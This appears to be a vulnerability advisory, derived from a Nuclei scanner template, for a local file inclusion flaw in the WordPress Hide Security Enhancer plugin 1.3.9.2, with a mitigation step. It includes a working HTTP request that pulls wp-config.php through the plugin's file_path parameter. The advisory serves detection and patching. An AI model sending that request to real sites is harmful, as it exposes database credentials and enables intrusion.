# Vulnerability: WordPress Hide Security Enhancer 1.3.9.2 Local File Inclusion
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`hide-security-enhancer-lfi.yaml`)

## Description
WordPress Hide Security Enhancer version 1.3.9.2 or less is susceptible to a local file inclusion vulnerability which could allow malicious visitors to download any file in the installation.

## Secure Mitigation
Upgrade to version 1.4 or later.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/wp-hide-security-enhancer/router/file-process.php?action=style-clean&file_path=/wp-config.php
```

